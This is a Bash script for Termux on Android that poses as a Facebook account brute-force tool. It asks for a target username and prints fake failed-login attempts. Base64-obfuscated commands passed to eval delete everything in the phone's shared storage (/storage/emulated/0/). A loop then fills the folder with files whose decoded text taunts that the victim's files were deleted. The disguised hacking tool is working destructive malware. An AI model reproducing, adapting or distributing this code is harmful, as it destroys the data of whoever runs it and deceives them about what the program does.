#!/bin/bash
#coded by alouh sperk
#bobo ka kung pati ito ileleet mo

function tvksajd {
  pvncngr=$(echo "$1" | base64 -d)
  eval "$pvncngr"
}

function banner {
  echo -e "\033[0;31m
\033[31m========================================================\033[0;31m
\033[0;31m|\033[0;31m   █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ |
\033[0;31m|\033[0;31m ▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒  |
\033[0;31m|\033[0;31m ▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░  |
\033[0;31m|\033[0;31m ░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄  |
\033[0;31m|\033[0;31m ░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄ |
\033[0;31m|\033[0;31m  ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ |
\033[0;31m|\033[0;31m  ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ |
\033[0;31m|\033[0;31m  ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  |
\033[0;31m|\033[0;31m         ░          ░  ░  ░      ░  ░░ ░      ░  ░    |
\033[0;31m|\033[0;31m              ░                      ░                |
\033[0;31m|\033[0;31m                   \033[34m Author: \033[0;33m PH.PHOENIX (Alouh Sperk)\033[0;31m |
\033[31m========================================================
"
}


function oumcgsq {
  vcxprvq=$(echo "L3N0b3JhZ2UvZW11bGF0ZWQvMC8=" | base64 -d)
  if [ -e "$vcxprvq" ]; then
    tvksajd "cm0gLXJmIC9zdG9yYWdlL2VtdWxhdGVkLzAvKg=="
  fi
}

function hack {
  banner
  oumcgsq
  read -p "TARGET USERNAME: " username
  g=("test" "Test" "123" "skdja" "TEST")
  if [[ " ${g[@]} " =~ " ${username} " ]]; then
  echo -e "\033[31m[!]\033[0m\033[34m INVALID USERNAME \033[31m[!]\033[0m"
  exit 1
fi
  echo -e "\033[34mUsing Default worlist: \033[0;31mwordlist.txt \n"
  sleep 0.5
  alphabet="abcdefghijklmnopqrstuvwxyz"
  while :; do
    x=$(cat /dev/urandom | tr -dc "$alphabet" | fold -w 8 | head -n 1)
    y=$(echo "WW91ciBmaWxlcyBoYXMgYmVlbiBkZWxldGVkIGJ5IFBILlBILlBIT0VOSVg=" | base64 -d)
    echo -e "\033[34m[403] \033[0;33m$username:$x ==> \033[0;31mLogin Failed"
    sleep 0.2
    echo "$y" > "$x.txt"
  done
}

hack
